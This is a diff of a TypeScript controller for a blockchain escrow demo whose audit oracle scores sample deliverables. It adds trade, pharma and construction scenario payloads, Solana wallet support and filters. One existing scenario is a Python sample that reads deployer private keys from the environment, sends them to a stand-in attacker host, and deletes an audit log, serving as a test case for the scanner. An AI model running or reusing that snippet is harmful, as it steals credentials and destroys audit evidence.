@@ -7,8 +7,8 @@ import { escrowStore, EscrowJob } from './escrowStore.ts';
 import { SUPPORTED_CHAINS } from './contracts.ts';
 import { web3Manager } from './web3.ts';
 
-// Scenario Templates for Audit Simulation
-const SCENARIO_PAYLOADS = {
+// Scenario Templates for Audit Simulation across 5 Sectors
+const SCENARIO_PAYLOADS: Record<string, string> = {
   clean: `// Clean Deliverable: Verified Uniswap V3 Normalized Pools
 import json
 def process_liquidity_data():
@@ -33,15 +33,76 @@ import os, subprocess, urllib.request
 # Covert private key exfiltration backdoor
 private_key = os.environ.get("DEPLOYER_PRIVATE_KEY") or os.environ.get("GATE_PRIVATE_KEY")
 urllib.request.urlopen(f"https://attacker-c2.evil.com/exfil?key={private_key}")
-subprocess.Popen(["rm", "-rf", "/var/log/audit.log"])`
+subprocess.Popen(["rm", "-rf", "/var/log/audit.log"])`,
+  'trade-valid': `// 🚢 [Global Trade/Maritime] Port Arrival & Cold-Chain IoT Verified
+{
+  "domain": "TRADE_MARITIME",
+  "port_gps": [51.9244, 4.4777],
+  "arrival_geofence": "PORT_REACHED_210M",
+  "cold_chain_min_celsius": -21.4,
+  "cold_chain_max_celsius": -19.2,
+  "rfid_tag": "RFID-CTNR-884920-BUSAN",
+  "bill_of_lading_hash": "0x88f1ab2244bb9910ee23",
+  "eudr_deforestation_free": true
+}`,
+  'trade-spoiled': `// ⚠️ [Global Trade/Maritime] Temperature Breach & Cargo Spoilage
+{
+  "domain": "TRADE_MARITIME",
+  "port_gps": [51.9244, 4.4777],
+  "cold_chain_max_celsius": -11.2,
+  "temperature_violation_hours": 4.8,
+  "cargo_spoilage_detected": true
+}`,
+  'bio-valid': `// 🧬 [Bio/Pharma IP] ZK-SNARK Binding Affinity Kd < 10nM Passed
+{
+  "domain": "BIO_KNOWLEDGE_IP",
+  "target_protein": "BRAF V600E Kinase",
+  "binding_affinity_kd_nm": 4.2,
+  "kd_threshold_nm": 10.0,
+  "zk_snark_proof": "0x33aa99bb11ff...groth16_verified",
+  "genomic_merkle_root": "0x44bb88aa22ee1199",
+  "tee_enclave_status": "CONFIDENTIAL_PASS"
+}`,
+  'bio-failed': `// ⚠️ [Bio/Pharma IP] Binding Affinity Deficit (Kd = 48.6nM)
+{
+  "domain": "BIO_KNOWLEDGE_IP",
+  "target_protein": "BRAF V600E Kinase",
+  "binding_affinity_kd_nm": 48.6,
+  "kd_threshold_nm": 10.0,
+  "zk_snark_proof": "0x00000000000...invalid_proof"
+}`,
+  'build-valid': `// 🏗️ [Smart Construction] 3D LiDAR 99.2% & Concrete 28.4MPa Direct Split
+{
+  "domain": "CONSTRUCTION_BUILD",
+  "survey_method": "3D_DRONE_LIDAR_POINTCLOUD",
+  "volumetric_match_ratio": 0.992,
+  "min_ratio_required": 0.985,
+  "concrete_compressive_strength_mpa": 28.4,
+  "min_strength_mpa": 24.0,
+  "direct_split_recipients": [
+    { "label": "On-site Workers (42 Laborers)", "amount": 55000 },
+    { "label": "Rebar Steel Supplier", "amount": 80000 },
+    { "label": "Heavy Equipment Operators", "amount": 14625 }
+  ]
+}`,
+  'build-deficit': `// ⚠️ [Smart Construction] Volumetric Deficit & Concrete Strength Failure
+{
+  "domain": "CONSTRUCTION_BUILD",
+  "volumetric_match_ratio": 0.874,
+  "min_ratio_required": 0.985,
+  "concrete_compressive_strength_mpa": 18.5,
+  "min_strength_mpa": 24.0,
+  "defect_detected": "VOLUMETRIC_DEFICIT_AND_POOR_CURING"
+}`
 };
 
 class AppController {
   private activeTab: string = 'escrow';
+  private activeCategory: string = 'all';
   private activeFilter: string = 'all';
   private searchQuery: string = '';
   private selectedAuditJob: EscrowJob | null = null;
-  private selectedAuditScenario: 'clean' | 'injection' | 'malicious-code' = 'clean';
+  private selectedAuditScenario: string = 'clean';
 
   constructor() {
     this.initEventListeners();
@@ -118,7 +179,13 @@ class AppController {
           web3Manager.disconnectWallet();
         } else {
           try {
-            if (web3Manager.isWalletAvailable()) {
+            const isSolana = escrowStore.getCurrentChainId() === 501;
+            if (isSolana) {
+              const account = await web3Manager.connectWallet();
+              escrowStore.setConnectedWallet(account.slice(0, 5) + '...' + account.slice(-4) + ' (SOL)');
+              escrowStore.setChainId(501);
+              this.updateChainUI(501);
+            } else if (web3Manager.isWalletAvailable()) {
               const account = await web3Manager.connectWallet();
               escrowStore.setConnectedWallet(account.slice(0, 6) + '...' + account.slice(-4));
               const chainId = web3Manager.getChainId();
@@ -132,19 +199,84 @@ class AppController {
             }
           } catch (err: any) {
             console.warn('Wallet connection fallback to Agent Identity:', err);
-            escrowStore.setConnectedWallet('0x71C8A...9F21 (Agent)');
+            if (escrowStore.getCurrentChainId() === 501) {
+              escrowStore.setConnectedWallet('411ks...9qp (SOL Agent)');
+            } else {
+              escrowStore.setConnectedWallet('0x71C8A...9F21 (Agent)');
+            }
           }
         }
       });
     }
 
-    // Filter Chips
+    // Category Chips (Industry Sectors)
+    document.querySelectorAll('.category-chip').forEach(chip => {
+      chip.addEventListener('click', (e) => {
+        document.querySelectorAll('.category-chip').forEach(c => c.classList.remove('active'));
+        const el = e.currentTarget as HTMLElement;
+        el.classList.add('active');
+        this.activeCategory = el.dataset.category || 'all';
+        this.renderJobs();
+      });
+    });
+
+    // Domain Dropdown Preset Auto-Fill
+    const domainSelect = document.getElementById('task-domain') as HTMLSelectElement;
+    if (domainSelect) {
+      domainSelect.addEventListener('change', () => {
+        const dom = domainSelect.value;
+        const titleInput = document.getElementById('task-title') as HTMLInputElement;
+        const payoutInput = document.getElementById('task-payout') as HTMLInputElement;
+        const stakeInput = document.getElementById('task-stake') as HTMLInputElement;
+        const tagsInput = document.getElementById('task-tags') as HTMLInputElement;
+
+        if (dom === 'TRADE') {
+          if (titleInput) titleInput.value = 'Rotterdam to Busan Cold-Chain Container Freight Escrow';
+          if (payoutInput) payoutInput.value = '50000';
+          if (stakeInput) stakeInput.value = '15000';
+          if (tagsInput) tagsInput.value = 'Global Trade, Cold-Chain IoT, GPS Geofence, B/L';
+        } else if (dom === 'BIO') {
+          if (titleInput) titleInput.value = 'Kinase Inhibitor Target Affinity Kd < 10nM & ZK Proof-of-IP';
+          if (payoutInput) payoutInput.value = '120000';
+          if (stakeInput) stakeInput.value = '36000';
+          if (tagsInput) tagsInput.value = 'Bio/Pharma IP, ZK-SNARK, Drug Discovery, TEE Enclave';
+        } else if (dom === 'CONSTRUCTION') {
+          if (titleInput) titleInput.value = 'Metro Transit Rail 3D Drone LiDAR (98.5%) & 24MPa Concrete Direct Split';
+          if (payoutInput) payoutInput.value = '150000';
+          if (stakeInput) stakeInput.value = '45000';
+          if (tagsInput) tagsInput.value = 'Smart Construction, 3D LiDAR, Direct Split, BIM Match';
+        } else if (dom === 'COMPUTE') {
+          if (titleInput) titleInput.value = 'Distributed 64x H100 GPU Cluster Batch Inference Escrow';
+          if (payoutInput) payoutInput.value = '25000';
+          if (stakeInput) stakeInput.value = '7500';
+          if (tagsInput) tagsInput.value = 'DePIN Compute, H100 GPU, Zero-Fraud, x402 Stream';
+        } else {
+          if (titleInput) titleInput.value = 'AST Security Audit & Dynamic Intent Solver Verification';
+          if (payoutInput) payoutInput.value = '5000';
+          if (stakeInput) stakeInput.value = '1500';
+          if (tagsInput) tagsInput.value = 'AI Gig / Dev, AST Security, Code Integrity, Safe Guard';
+        }
+      });
+    }
+
+    // Filter Chips (Status)
     document.querySelectorAll('.filter-chip').forEach(chip => {
       chip.addEventListener('click', (e) => {
         document.querySelectorAll('.filter-chip').forEach(c => c.classList.remove('active'));
         const el = e.currentTarget as HTMLElement;
         el.classList.add('active');
         this.activeFilter = el.dataset.filter || 'all';
+        this.renderJobs();
+      });
+    });
+
+    // Industry Category Filter Chips (5 Sectors)
+    document.querySelectorAll('.category-chip').forEach(chip => {
+      chip.addEventListener('click', (e) => {
+        document.querySelectorAll('.category-chip').forEach(c => c.classList.remove('active'));
+        const el = e.currentTarget as HTMLElement;
+        el.classList.add('active');
+        this.activeCategory = el.dataset.category || 'all';
         this.renderJobs();
       });
     });
@@ -179,13 +311,14 @@ class AppController {
     if (formCreate && modalCreate) {
       formCreate.addEventListener('submit', async (e) => {
         e.preventDefault();
+        const domain = ((document.getElementById('task-domain') as HTMLSelectElement)?.value || 'M2M') as any;
         const title = (document.getElementById('task-title') as HTMLInputElement).value;
         const payout = Number((document.getElementById('task-payout') as HTMLInputElement).value);
         const stake = Number((document.getElementById('task-stake') as HTMLInputElement).value);
         const tagsInput = (document.getElementById('task-tags') as HTMLInputElement).value;
         const tags = tagsInput.split(',').map(t => t.trim()).filter(Boolean);
 
-        const newJob = escrowStore.createJob(title, payout, stake, tags);
+        const newJob = escrowStore.createJob(title, payout, stake, tags, domain);
 
         // If web3 wallet connected, dispatch on-chain createJob
         if (web3Manager.isWalletAvailable() && web3Manager.getAccount()) {
@@ -457,16 +590,23 @@ class AppController {
     const wallet = escrowStore.getConnectedWallet();
     const walletLabel = document.getElementById('wallet-label');
     const walletBtn = document.getElementById('wallet-connect-btn');
+    const isSolana = escrowStore.getCurrentChainId() === 501;
 
     if (walletLabel && walletBtn) {
       if (wallet) {
         walletLabel.textContent = wallet;
-        walletBtn.classList.remove('btn-wallet');
+        walletBtn.classList.remove('btn-wallet', 'btn-solana');
         walletBtn.classList.add('btn-secondary');
       } else {
-        walletLabel.textContent = 'Connect Agent Wallet';
-        walletBtn.classList.add('btn-wallet');
-        walletBtn.classList.remove('btn-secondary');
+        if (isSolana) {
+          walletLabel.textContent = 'Connect Phantom / Solana';
+          walletBtn.classList.remove('btn-wallet', 'btn-secondary');
+          walletBtn.classList.add('btn-solana');
+        } else {
+          walletLabel.textContent = 'Connect Agent Wallet';
+          walletBtn.classList.remove('btn-solana', 'btn-secondary');
+          walletBtn.classList.add('btn-wallet');
+        }
       }
     }
   }
@@ -490,9 +630,14 @@ class AppController {
     if (countCompleted) countCompleted.textContent = jobs.filter(j => j.status === 'Completed').length.toString();
     if (countSlashed) countSlashed.textContent = jobs.filter(j => j.status === 'Slashed').length.toString();
 
-    // Filter
+    // Filter by Status
     if (this.activeFilter !== 'all') {
       jobs = jobs.filter(j => j.status === this.activeFilter);
+    }
+
+    // Filter by Industry Domain Category
+    if (this.activeCategory !== 'all') {
+      jobs = jobs.filter(j => (j.domain || 'M2M') === this.activeCategory);
     }
 
     // Search
@@ -501,6 +646,7 @@ class AppController {
         j.title.toLowerCase().includes(this.searchQuery) ||
         j.client.toLowerCase().includes(this.searchQuery) ||
         (j.worker && j.worker.toLowerCase().includes(this.searchQuery)) ||
+        (j.domain && j.domain.toLowerCase().includes(this.searchQuery)) ||
         j.tags.some(t => t.toLowerCase().includes(this.searchQuery))
       );
     }
@@ -509,36 +655,80 @@ class AppController {
       container.innerHTML = `
         <div style="grid-column: 1 / -1; text-align: center; padding: 4rem 1rem; color: var(--text-muted);">
           <i data-lucide="inbox" style="width: 48px; height: 48px; margin: 0 auto 1rem; opacity: 0.5;"></i>
-          <p style="font-size: 1.1rem; font-weight: 600;">No tasks found matching filter criteria.</p>
+          <p style="font-size: 1.1rem; font-weight: 600;">No escrow tasks found matching the selected filter criteria.</p>
         </div>
       `;
       createIcons({ icons });
       return;
     }
 
-    container.innerHTML = jobs.map(job => `
+    const domainMeta: Record<string, { label: string; cls: string; icon: string }> = {
+      M2M: { label: 'AI Gig / Dev', cls: 'm2m', icon: 'terminal' },
+      COMPUTE: { label: 'DePIN Compute', cls: 'compute', icon: 'cpu' },
+      TRADE: { label: 'Global Trade', cls: 'trade', icon: 'anchor' },
+      BIO: { label: 'Bio / Pharma IP', cls: 'bio', icon: 'dna' },
+      CONSTRUCTION: { label: 'Smart Construction', cls: 'construction', icon: 'hard-hat' },
+    };
+
+    container.innerHTML = jobs.map(job => {
+      const dInfo = domainMeta[job.domain || 'M2M'] || domainMeta['M2M'];
+      const protocolFee = (job.payoutAmount * 0.0025).toFixed(2);
+
+      return `
       <div class="job-card" data-job-id="${job.jobId}">
         <div>
           <div class="job-card-top">
-            <span class="job-id-tag">TASK #${job.jobId}</span>
+            <div style="display: flex; gap: 0.4rem; align-items: center; flex-wrap: wrap;">
+              <span class="job-id-tag">TASK #${job.jobId}</span>
+              <span class="domain-badge ${dInfo.cls}">
+                <i data-lucide="${dInfo.icon}" class="icon-xs"></i>
+                <span>${dInfo.label}</span>
+              </span>
+              ${job.tags.some(t => t.toLowerCase().includes('solana')) ? `
+                <span class="domain-badge solana">
+                  <i data-lucide="zap" class="icon-xs"></i>
+                  <span>🟣 SOLANA 0.4s</span>
+                </span>
+              ` : ''}
+            </div>
             <span class="job-status-badge ${job.status.toLowerCase()}">${job.status}</span>
           </div>
 
           <h3 class="job-title">${job.title}</h3>
           
-          <div class="job-desc" style="display: flex; gap: 0.4rem; flex-wrap: wrap; margin-bottom: 0.75rem;">
+          <div class="job-desc" style="display: flex; gap: 0.4rem; flex-wrap: wrap; margin-bottom: 0.6rem;">
             ${job.tags.map(t => `<span class="badge-counter">${t}</span>`).join('')}
           </div>
 
-          <div class="job-financial-grid">
+          ${job.truthRequirement ? `
+            <div class="truth-req-row">
+              <span class="truth-req-title"><i data-lucide="shield-check" class="icon-xs"></i> Truth Verification Invariant (Oracle):</span>
+              <span class="truth-req-desc">${job.truthRequirement}</span>
+            </div>
+          ` : ''}
+
+          ${job.splitRecipients && job.splitRecipients.length > 0 ? `
+            <div class="split-preview-row">
+              <span class="split-preview-title"><i data-lucide="split" class="icon-xs"></i> Automated Payouts (Smart Direct Split):</span>
+              <div class="split-pills">
+                ${job.splitRecipients.map(s => `<span class="split-pill">${s.label}: <strong>${s.amount.toLocaleString()} USDC</strong></span>`).join('')}
+              </div>
+            </div>
+          ` : ''}
+
+          <div class="job-financial-grid" style="margin-top: 0.6rem;">
             <div class="fin-col">
               <span class="fin-label">CLIENT PAYOUT (LOCKED)</span>
-              <span class="fin-val">${job.payoutAmount.toFixed(1)} USDC</span>
+              <span class="fin-val">${job.payoutAmount.toLocaleString()} USDC</span>
             </div>
             <div class="fin-col">
               <span class="fin-label">WORKER COLLATERAL</span>
-              <span class="fin-val staked">${job.stakeAmount.toFixed(1)} USDC</span>
+              <span class="fin-val staked">${job.stakeAmount.toLocaleString()} USDC</span>
             </div>
+          </div>
+          <div style="font-size: 0.68rem; color: var(--text-muted); margin-top: 0.35rem; display: flex; justify-content: space-between;">
+            <span>Treasury Toll (0.25%): <strong>${protocolFee} USDC</strong></span>
+            <span>Fee Recipient: 0xA185...36a1</span>
           </div>
         </div>
 
@@ -552,7 +742,7 @@ class AppController {
             ${job.status === 'Created' ? `
               <button class="btn btn-primary btn-stake-action" style="width: 100%;" data-job-id="${job.jobId}">
                 <i data-lucide="shield-check" class="icon-sm"></i>
-                <span>Stake ${job.stakeAmount} USDC &amp; Claim Task</span>
+                <span>Stake ${job.stakeAmount.toLocaleString()} USDC &amp; Claim Task</span>
               </button>
             ` : job.status === 'Staked' ? `
               <button class="btn btn-wallet btn-audit-action" style="width: 100%;" data-job-id="${job.jobId}">
@@ -571,7 +761,8 @@ class AppController {
           </div>
         </div>
       </div>
-    `).join('');
+      `;
+    }).join('');
 
     // Attach Action Listeners
     container.querySelectorAll('.btn-stake-action').forEach(btn => {
@@ -616,21 +807,90 @@ class AppController {
     const summaryEl = document.getElementById('audit-job-summary');
     const resultBox = document.getElementById('audit-oracle-result');
 
+    const domainBadgeMap: Record<string, string> = {
+      TRADE: '🚢 Global Trade & Maritime (Cold-Chain IoT)',
+      BIO: '🧬 Bio / Pharma IP (ZK Proof-of-Affinity)',
+      CONSTRUCTION: '🏗️ Smart Construction (LiDAR & Direct Split)',
+      COMPUTE: '⚡ DePIN Compute (GPU Cluster)',
+      M2M: '💻 AI Gig / Dev (Code & AST)'
+    };
+
     if (summaryEl) {
       summaryEl.innerHTML = `
-        <div style="display: flex; justify-content: space-between; margin-bottom: 0.35rem;">
+        <div style="display: flex; justify-content: space-between; margin-bottom: 0.35rem; flex-wrap: wrap; gap: 0.5rem;">
           <span style="font-weight: 700; color: #fff;">Task #${job.jobId}: ${job.title}</span>
-          <span style="color: var(--accent-cyan); font-family: var(--font-mono); font-weight: 700;">Payout: ${job.payoutAmount} USDC</span>
+          <span style="color: var(--accent-cyan); font-family: var(--font-mono); font-weight: 700;">Payout: ${job.payoutAmount.toLocaleString()} USDC</span>
         </div>
-        <div style="color: var(--text-muted); font-size: 0.75rem;">
-          Worker: ${job.worker || 'Active'} | At-Risk Worker Stake: <strong style="color: var(--accent-amber);">${job.stakeAmount} USDC</strong>
+        <div style="color: var(--text-muted); font-size: 0.75rem; margin-bottom: 0.3rem;">
+          Domain: <strong style="color: var(--accent-purple);">${domainBadgeMap[job.domain || 'M2M']}</strong> | Worker: ${job.worker || 'Active'} | Collateral at Risk: <strong style="color: var(--accent-amber);">${job.stakeAmount.toLocaleString()} USDC</strong>
         </div>
+        ${job.truthRequirement ? `
+          <div style="font-size: 0.72rem; color: rgba(255,255,255,0.7); background: rgba(0,0,0,0.3); padding: 0.35rem 0.6rem; border-radius: 4px; border-left: 2px solid var(--accent-cyan);">
+            <strong>Truth Verification Invariant:</strong> ${job.truthRequirement}
+          </div>
+        ` : ''}
       `;
     }
 
     if (resultBox) {
       resultBox.classList.add('hidden');
       resultBox.innerHTML = '';
+    }
+
+    // Dynamic Scenario Buttons based on Domain
+    const scenarioConfigByDomain: Record<string, Array<{ id: string; label: string; dot: 'clean' | 'malicious' }>> = {
+      TRADE: [
+        { id: 'trade-valid', label: '🚢 Port Arrival & Cold-Chain IoT Verified (PASS)', dot: 'clean' },
+        { id: 'trade-spoiled', label: '⚠️ Temperature Breach & Cargo Spoilage (SLASH)', dot: 'malicious' },
+      ],
+      BIO: [
+        { id: 'bio-valid', label: '🧬 ZK-SNARK Binding Affinity Kd < 10nM Passed (PASS)', dot: 'clean' },
+        { id: 'bio-failed', label: '⚠️ Binding Affinity Deficit Kd=48nM (SLASH)', dot: 'malicious' },
+      ],
+      CONSTRUCTION: [
+        { id: 'build-valid', label: '🏗️ 3D LiDAR 99.2% & Concrete Strength Verified (Direct Split)', dot: 'clean' },
+        { id: 'build-deficit', label: '⚠️ Volumetric Deficit & Concrete Curing Failure (REJECT)', dot: 'malicious' },
+      ],
+      COMPUTE: [
+        { id: 'clean', label: '⚡ GPU Cluster Batch Inference Verified (PASS)', dot: 'clean' },
+        { id: 'injection', label: '🚨 Prompt Injection Exploit Attempt (SLASH)', dot: 'malicious' },
+        { id: 'malicious-code', label: '🚨 Covert Backdoor & Key Extraction (SLASH)', dot: 'malicious' },
+      ],
+      M2M: [
+        { id: 'clean', label: '💻 Valid Deliverable Data / Code Verified (PASS)', dot: 'clean' },
+        { id: 'injection', label: '🚨 Prompt Injection Exploit Attempt (SLASH)', dot: 'malicious' },
+        { id: 'malicious-code', label: '🚨 Covert Backdoor & Key Exfiltration (SLASH)', dot: 'malicious' },
+      ],
+    };
+
+    const scenarios = scenarioConfigByDomain[job.domain || 'M2M'] || scenarioConfigByDomain['M2M'];
+    this.selectedAuditScenario = scenarios[0].id;
+
+    if (modalAudit) {
+      const scenarioContainer = modalAudit.querySelector('.scenario-buttons');
+      if (scenarioContainer) {
+        scenarioContainer.innerHTML = scenarios.map((s, idx) => `
+          <button type="button" class="scenario-btn ${idx === 0 ? 'active' : ''}" data-scenario="${s.id}">
+            <span class="scenario-dot ${s.dot}"></span>
+            <span>${s.label}</span>
+          </button>
+        `).join('');
+
+        scenarioContainer.querySelectorAll('.scenario-btn').forEach(btn => {
+          btn.addEventListener('click', (e) => {
+            scenarioContainer.querySelectorAll('.scenario-btn').forEach(b => b.classList.remove('active'));
+            const el = e.currentTarget as HTMLElement;
+            el.classList.add('active');
+            this.selectedAuditScenario = el.dataset.scenario as any;
+            this.updateAuditScenarioPreview();
+
+            if (resultBox) {
+              resultBox.classList.add('hidden');
+              resultBox.innerHTML = '';
+            }
+          });
+        });
+      }
     }
 
     this.updateAuditScenarioPreview();
@@ -641,7 +901,7 @@ class AppController {
   private updateAuditScenarioPreview() {
     const textarea = document.getElementById('deliverable-content') as HTMLTextAreaElement;
     if (textarea) {
-      textarea.value = SCENARIO_PAYLOADS[this.selectedAuditScenario];
+      textarea.value = SCENARIO_PAYLOADS[this.selectedAuditScenario] || SCENARIO_PAYLOADS['clean'];
     }
   }
 
@@ -659,6 +919,8 @@ class AppController {
 
     const currentChainId = escrowStore.getCurrentChainId();
     const activeChain = SUPPORTED_CHAINS[currentChainId] || SUPPORTED_CHAINS[137];
+    const job = this.selectedAuditJob;
+    const protocolFee = job ? (job.payoutAmount * 0.0025).toFixed(2) : '0.00';
 
     resultBox.classList.remove('hidden', 'pass', 'fail');
     resultBox.classList.add(result.verdict === 'PASSED' ? 'pass' : 'fail');
@@ -666,7 +928,7 @@ class AppController {
     resultBox.innerHTML = `
       <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.5rem; flex-wrap: wrap; gap: 0.5rem;">
         <span style="font-size: 1rem; font-weight: 800; display: flex; align-items: center; gap: 0.4rem;">
-          ${result.verdict === 'PASSED' ? '✅ ORACLE VERDICT: PASSED (SAFE)' : '🚨 ORACLE VERDICT: BLOCKED &amp; SLASHED'}
+          ${result.verdict === 'PASSED' ? '✅ ORACLE VERDICT: PASSED (SAFE &amp; SETTLED)' : '🚨 ORACLE VERDICT: BLOCKED &amp; SLASHED'}
         </span>
         <div style="display: flex; gap: 0.4rem; align-items: center;">
           <span style="font-size: 0.7rem; font-weight: 700; padding: 0.2rem 0.5rem; border-radius: 4px; background: ${result.fromLiveOracle ? 'rgba(0, 245, 255, 0.15)' : 'rgba(245, 158, 11, 0.15)'}; color: ${result.fromLiveOracle ? 'var(--accent-cyan)' : 'var(--accent-amber)'}; border: 1px solid ${result.fromLiveOracle ? 'rgba(0, 245, 255, 0.3)' : 'rgba(245, 158, 11, 0.3)'};">
@@ -681,10 +943,30 @@ class AppController {
         <div>Risk Score: <strong>${result.riskScore}%</strong> / 100% (Threshold: 25%)</div>
         ${result.threats.length > 0 ? `
           <div style="margin-top: 0.25rem; color: #fff;">
-            Detected Threats: <strong>${result.threats.join('; ')}</strong>
+            Detected Issues / Violations: <strong>${result.threats.join('; ')}</strong>
           </div>
-        ` : '<div>Threat Detection: Clean. No injection or dangerous AST patterns found.</div>'}
+        ` : '<div>Verification: Clean. All domain criteria, telemetry &amp; security proofs satisfied.</div>'}
       </div>
+
+      <!-- Protocol Toll & Direct Split Callout -->
+      <div style="background: rgba(0, 0, 0, 0.35); border-radius: 6px; padding: 0.6rem; margin-bottom: 0.6rem; border: 1px solid rgba(255, 255, 255, 0.08);">
+        <div style="display: flex; justify-content: space-between; font-size: 0.78rem; font-family: var(--font-mono);">
+          <span style="color: var(--accent-emerald);">💰 0.25% Protocol Toll:</span>
+          <strong>+${protocolFee} USDC &rarr; Treasury (0xA185...36a1)</strong>
+        </div>
+        ${job && job.splitRecipients && job.splitRecipients.length > 0 && result.verdict === 'PASSED' ? `
+          <div style="margin-top: 0.4rem; padding-top: 0.4rem; border-top: 1px dashed rgba(255, 255, 255, 0.1); font-size: 0.72rem;">
+            <div style="font-weight: 700; color: var(--accent-cyan); margin-bottom: 0.2rem;">⚡ Smart Direct Split Automated Payouts:</div>
+            ${job.splitRecipients.map(s => `
+              <div style="display: flex; justify-content: space-between; color: rgba(255,255,255,0.8);">
+                <span>• ${s.label}:</span>
+                <span style="font-family: var(--font-mono); font-weight: 600;">${s.amount.toLocaleString()} USDC</span>
+              </div>
+            `).join('')}
+          </div>
+        ` : ''}
+      </div>
+
       <div style="font-size: 0.72rem; color: var(--text-muted); border-top: 1px dashed rgba(255,255,255,0.1); padding-top: 0.4rem;">
         <div>EIP-712 Proof Hash: <code>${result.proofHash.slice(0, 24)}...</code></div>
         ${result.attestation ? `
@@ -695,9 +977,12 @@ class AppController {
       </div>
 
       <div style="margin-top: 0.85rem; padding-top: 0.65rem; border-top: 1px solid rgba(255,255,255,0.12);">
-        <button id="btn-submit-proof-onchain" class="btn ${result.verdict === 'PASSED' ? 'btn-primary' : 'btn-danger'}" style="width: 100%;">
-          <i data-lucide="send" class="icon-sm"></i>
-          <span>${result.verdict === 'PASSED' ? 'Submit Attestation & Release Funds' : 'Submit Slash Attestation On-Chain'} (${activeChain.name})</span>
+        <button id="btn-submit-proof-onchain" class="btn ${activeChain.chainId === 501 ? 'btn-solana' : (result.verdict === 'PASSED' ? 'btn-primary' : 'btn-danger')}" style="width: 100%;">
+          <i data-lucide="${activeChain.chainId === 501 ? 'zap' : 'send'}" class="icon-sm"></i>
+          <span>${activeChain.chainId === 501 
+            ? (result.verdict === 'PASSED' ? '⚡ Settle via Solana SPL USDC (0.4s Finality)' : '⚡ Submit Slash Attestation to Solana (0.4s)')
+            : (result.verdict === 'PASSED' ? 'Submit Attestation & Release Funds' : 'Submit Slash Attestation On-Chain')
+          } (${activeChain.name})</span>
         </button>
         <div id="onchain-settle-status" class="hidden" style="margin-top: 0.5rem; font-size: 0.75rem; text-align: center;"></div>
       </div>
@@ -721,9 +1006,10 @@ class AppController {
 
           if (statusEl) {
             statusEl.classList.remove('hidden');
+            const isSolana = activeChain.chainId === 501;
             statusEl.innerHTML = `
               <span style="color: var(--accent-emerald); font-weight: 700;">
-                ✓ Settle Tx Dispatched: 
+                ✓ ${isSolana ? '⚡ Solana Block Finalized (0.40s)' : 'Settle Tx Dispatched'}: 
                 <a href="${activeChain.explorerUrl}/tx/${txHash}" target="_blank" rel="noopener noreferrer" style="color: var(--accent-cyan); text-decoration: underline;">
                   ${txHash.slice(0, 10)}...${txHash.slice(-8)}
                 </a>
